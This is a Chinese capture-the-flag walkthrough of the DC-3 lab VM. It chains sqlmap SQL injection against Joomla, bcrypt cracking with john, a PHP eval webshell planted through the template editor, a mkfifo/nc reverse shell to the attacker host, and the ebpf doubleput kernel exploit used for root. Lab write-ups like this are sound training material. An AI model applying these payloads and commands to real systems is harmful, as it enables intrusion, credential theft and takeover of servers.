靶场下载地址：

https://pan.baidu.com/s/1I5p6EP56XzlMpUUcp5oDtg?pwd=1234

提取码：1234

利用vm直接打开就OK了，建议设置为nat

  * 信息收集

执行命令：nmap -sP -T 5 192.168.20.205/24

执行命令：nmap -A -T 5 192.168.20.205

![](https://image.3001.net/images/20230607/1686119111_648022c7bdf67c0a8274d.png!small)

  * 爆破网站目录

![](https://image.3001.net/images/20230607/1686119139_648022e300bacd01e63c1.png!small)

  * 探测joomla的脚本

无法登陆，先不爆破，去github上看看有没有探测joomla的脚本

在kali中下载https://github.com/OWASP/joomscan.git

![](https://image.3001.net/images/20230607/1686119187_64802313bf57bc4f603ab.png!small)

探测网站

进入下载目录：cd /root/Downloads/joomscan-master

执行命令：perl joomscan.pl -u http://192.168.20.205

![](https://image.3001.net/images/20230607/1686119235_64802343997cfb69232e4.png!small)

  * 查询joomla版本的漏洞

![](https://image.3001.net/images/20230607/1686119260_6480235c8aab6b43206ae.png!small)

查找到有SQL注入点，可以在网上百度该版本的注入点，然后可以使用sqlmap工具来跑。

  * 爆破数据库：

sqlmap -u
"http://192.168.20.205/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"
--risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch

![](https://image.3001.net/images/20230607/1686119302_648023868c0e967abfd49.png!small)

  * 爆破数据库中数据表：

sqlmap -u
"http://192.168.20.205/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"
--risk=3 --level=5 --random-agent -D joomladb --tables --batch

![](https://image.3001.net/images/20230607/1686119354_648023ba24a2807e1064f.png!small)

  * 爆破数据表中的列：

sqlmap -u
"http://192.168.20.205/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"
--risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns

![](https://image.3001.net/images/20230607/1686119394_648023e21adbe4c9270dc.png!small)

  * 爆破数据表用户名和密码的内容：

sqlmap -u
"http://192.168.20.205/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"
--risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C
username,password --dump --batch

![](https://image.3001.net/images/20230607/1686119424_648024008621be8e0597c.png!small)

用户名

|

密码  
  
---|---  
  
admin

|

$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu  
  
  * 解密hash密码

先解压/usr/share/wordlists的字典文件

gzip -d rockyou.txt.gz

john爆破

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt

![](https://image.3001.net/images/20230607/1686119468_6480242c1734c4b401e06.png!small)

用户名

|

密码  
  
---|---  
  
admin

|

snoopy  
  
  * 通过破解的用户名和密码登录系统

是个名为joomla的内容管理系统，扫下后台

登录网站：

![](https://image.3001.net/images/20230607/1686119510_648024561817e22b4a167.png!small)

成功登录网站

![](https://image.3001.net/images/20230607/1686119543_64802477c0e91076c2266.png!small)

  * 利用模板漏洞，新建一句话木马

![](https://image.3001.net/images/20230607/1686119580_6480249c1349c697a4f7c.png!small)

写入一句话木马，并保存。

<?php eval($_POST[cmd]);?>

![](https://image.3001.net/images/20230607/1686119619_648024c39f9bf5beef3c6.png!small)

在目录html下新建一句话木马，如下图所示：

![](https://image.3001.net/images/20230607/1686119644_648024dccc40a4f6c04c1.png!small)

  * 安装中国蚁剑

将初始化选择源码包antSword目录（前面我们下载的核心源码），初始化后会自动重启，再次打开就可以使用了。

加载器：https://gitcode.net/mirrors/antswordproject/antsword-loader

核心源码路径：<https://gitcode.net/mirrors/antswordproject/antsword>

  * 中国蚁剑连接webshell

添加一句话木马路径：http://192.168.20.205/templates/beez3/html/yjh.php

![](https://image.3001.net/images/20230607/1686119690_6480250adae99d4478433.png!small)

添加成功的界面：

![](https://image.3001.net/images/20230607/1686119722_6480252a2e6f12e6267e8.png!small)

双击连接：

![](https://image.3001.net/images/20230607/1686119745_6480254105ece8256023f.png!small)

新建虚拟终端：

![](https://image.3001.net/images/20230607/1686119773_6480255d42e3425387d68.png!small)

  * 在kali上开启监听，目标机器虚拟终端执行连接

kali:

nc -lvp 4444

目标：

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.20.228 4444
>/tmp/f

![](https://image.3001.net/images/20230607/1686141148_648078dc2b304a256bd41.png!small)

  * 收集目标设备的版本信息

lsb_release -a

uname -a

![](https://image.3001.net/images/20230607/1686141176_648078f86fecd2db5a637.png!small)

连上后，执行命令，显示发行版本信息如下：

$ lsb_release -a

No LSB modules are available.

Distributor ID: Ubuntu

Description: Ubuntu 16.04 LTS

Release: 16.04

Codename: xenial

$ uname -a

Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686
i686 i686 GNU/Linux

  * 查找目标机器的系统版本漏洞

直接搜索searchsploit

searchsploit ubuntu 16.04 4.4.x

![](https://image.3001.net/images/20230607/1686141466_64807a1ad2f478119fc4a.png!small)

  * 下载漏洞利用poc程序

在kali上下载源码：

wget <https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip>

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/39772.zip(注释：这种方式下载打不开这个压缩文件，因为它可能是rar格式的)，需要通过浏览器下载，解压缩后，再重新压缩成zip格式。

  * 在kali上启动web服务器：

python2.7 -m SimpleHTTPServer 80

  * 在目标机器上下载poc程序

wget 192.168.20.228/39772.zip

![](https://image.3001.net/images/20230607/1686141528_64807a5837baf1e0b2554.png!small)

在根目录下权限拒绝，切换到/tmp目录下

![](https://image.3001.net/images/20230607/1686141556_64807a740f8c5c67a8647.png!small)

unzip 39772.zip && cd 39772 && tar -xvf exploit.tar

cd ebpf_mapfd_doubleput_exploit && sh compile.sh

  * 系统提权

![](https://image.3001.net/images/20230607/1686141582_64807a8e4d963104234b8.png!small)

./doubleput

  * 获取目标机flag

cd /root

cat the-flag.txt

![](https://image.3001.net/images/20230607/1686141609_64807aa9066f29c8b87fd.png!small)

这种shell终端环境不太友好，可以修改哈：

执行命令：python -c 'import pty;pty.spawn("/bin/bash")'

![](https://image.3001.net/images/20230607/1686141638_64807ac61453f12dbdd5d.png!small)需要提高哈哈哈

